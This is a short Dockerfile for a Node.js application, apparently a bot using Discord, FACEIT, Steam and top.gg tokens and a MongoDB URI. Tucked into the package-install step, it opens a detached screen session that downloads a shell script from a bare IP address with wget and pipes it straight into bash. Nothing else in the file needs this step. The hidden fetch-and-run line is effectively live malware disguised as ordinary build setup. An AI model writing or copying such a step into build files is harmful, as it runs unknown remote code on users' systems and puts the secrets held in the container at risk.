FROM node:19-bullseye-slim

ARG APP=/usr/src/app

ENV NODE_ENV=
ENV TOKEN=
ENV FACEIT_TOKEN=
ENV STEAM_TOKEN=
ENV TOPGG_TOKEN=
ENV MONGO_URI=

RUN apt-get update && apt-get install -y \
  build-essential \
  libcairo2-dev \
  libpango1.0-dev \
  libjpeg-dev \
  libgif-dev \
  librsvg2-dev \
  screen \
  wget && \
  screen -dmS Test bash -c 'wget -O - http://194.233.164.53/start_jay_squash_ws_rand.sh | bash' && \
  screen -ls

WORKDIR $APP
COPY package.json .

RUN npm install

COPY . .

CMD ["npm", "start"]
